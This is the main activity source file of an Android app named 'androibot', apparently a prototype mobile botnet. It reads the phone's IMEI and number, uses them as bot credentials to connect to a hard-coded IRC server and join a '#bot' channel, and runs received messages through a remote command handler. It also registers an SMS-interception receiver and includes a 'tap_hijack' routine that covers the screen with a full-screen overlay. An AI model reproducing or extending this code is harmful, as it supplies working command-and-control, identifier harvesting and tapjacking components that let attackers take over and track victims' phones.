package xjtu.androibot;

import java.util.Timer;
import java.util.TimerTask;

import android.app.Activity;
import android.content.Context;
import android.content.IntentFilter;
import android.os.Bundle;
import android.os.Handler;
import android.os.Looper;
import android.os.Message;
import android.telephony.TelephonyManager;
import android.util.Log;
import android.view.Gravity;
import android.view.View;
import android.widget.ImageView;
import android.widget.Toast;

import xjtu.androibot.IRCMessage;

public class MainActivity extends Activity {
    /** Called when the activity is first created. */
	private static MainActivity instance;	
	public static Handler mHandler;
	public static AndBot bot;
	
	public static MainActivity getInstance()
	{
		return instance;
	}	
	
    @Override
    public void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        setContentView(R.layout.main);        
    }
    
    public void smsbot_click(View view)
    {
    	try
    	{
    		this.registerReceiver(new SMSReceiver(),new IntentFilter("android.provider.Telephony.SMS_RECEIVED"));
    		Toast.makeText(this, "smsbot启动成功", Toast.LENGTH_LONG).show();
    	}
    	catch(Exception e)
    	{
    		Toast.makeText(this, e.getMessage(), Toast.LENGTH_LONG).show();
    	}
    }
    
    public void ircbot_click(View view)
    {
    	TelephonyManager telephonyManager = (TelephonyManager)this.getSystemService(Context.TELEPHONY_SERVICE);
		String imei = telephonyManager.getDeviceId();
		String phonenum = telephonyManager.getLine1Number();
    	bot = new AndBot("P"+phonenum,"P"+phonenum+"@sillybot.com", imei);    	
    	Toast.makeText(this, bot.getName()+"\n" + bot.getLogin() + "\n" + bot.getFinger() + "\n" + bot.getVersion(), Toast.LENGTH_LONG).show();   		
    	try
    	{
    		//AndBot bot = new AndBot(this);
    		//Toast.makeText(this, "ircbot启动成功", Toast.LENGTH_LONG).show();
    		//andBot.setVerbose(true);    		
    		bot.connect("222.91.160.75");
    		bot.joinChannel("#bot");
    		Toast.makeText(this, "ircbot连接成功", Toast.LENGTH_LONG).show();   		
    		mHandler = MakeHandler(); 		
    	}
    	catch(Exception e)
    	{
    		Toast.makeText(this, "Exception:" + e.getMessage(), Toast.LENGTH_LONG).show();
    	}
    }
    
    public void tap_hijack(View view)
    {
    	Timer mTimer = new Timer();    	
    	mTimer.schedule(new TimerTask(){
    		public void run(){
    			Looper.prepare();
    			ShowToast();
    			Looper.loop();    			
    		}
    	},3000);    	
    	
    }
    
    public void ShowToast()
    {
    	Toast toast = new Toast(this);
    	ImageView imageview = new ImageView(this);
    	imageview.setImageResource(R.drawable.icon);
    	toast.setView(imageview);
    	toast.setDuration(Toast.LENGTH_LONG);
    	toast.setGravity(Gravity.FILL_HORIZONTAL|Gravity.FILL_VERTICAL, 0, 0);
    	toast.show();
    }
    
    public Handler MakeHandler()
    {
    	Handler mHandler = new Handler()
		{
			@Override
			public void handleMessage(Message msg)
			{
				IRCMessage ircMsg = (IRCMessage)msg.obj;	
				//Toast.makeText(MainActivity.this, "接收到命令：\n"+message, Toast.LENGTH_LONG).show();
				new HandleCommand(MainActivity.this,ircMsg).HandleIRC(); 
				
				}
		};
		return mHandler;
    }
}

